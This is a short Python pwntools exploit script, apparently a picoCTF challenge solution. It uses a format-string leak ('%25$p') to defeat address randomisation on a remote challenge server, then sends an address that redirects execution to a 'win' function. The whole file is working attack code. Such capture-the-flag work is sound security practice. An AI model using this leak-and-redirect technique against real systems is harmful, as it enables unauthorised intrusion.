#!/usr/bin/env python3
from pwn import *
exe = ELF('vuln', checksec = False)

# p = process(exe.path)
p = remote('rescued-float.picoctf.net', 53017)

# input()
p.sendlineafter(b':', f'%25$p'.encode())
exe_leak = int(p.recvline(), 16)
exe.address = exe_leak - 0x1400
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))
log.info("win: " + hex(exe.address + 0x136A))

p.sendlineafter(b'0x12345: ', p64(exe_leak - 0x96))
# print(hex(exe.sym['win']))


p.interactive()